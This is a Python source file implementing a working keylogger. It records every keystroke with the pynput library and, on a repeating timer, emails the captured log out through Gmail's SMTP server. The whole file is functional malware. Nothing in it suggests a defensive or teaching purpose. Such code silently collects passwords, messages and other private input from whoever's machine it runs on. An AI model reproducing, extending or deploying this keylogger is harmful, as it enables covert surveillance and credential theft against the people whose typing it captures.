import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started\n"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.email_subject = "Keylogger Report"

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = f" {key} "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, self.email_subject, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def format_email(self, subject, body):
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        return msg

    def send_mail(self, email, password, subject, body):
        email_msg = self.format_email(subject, body)
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, email_msg.as_string())
            server.quit()
            print("Email sent successfully.")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

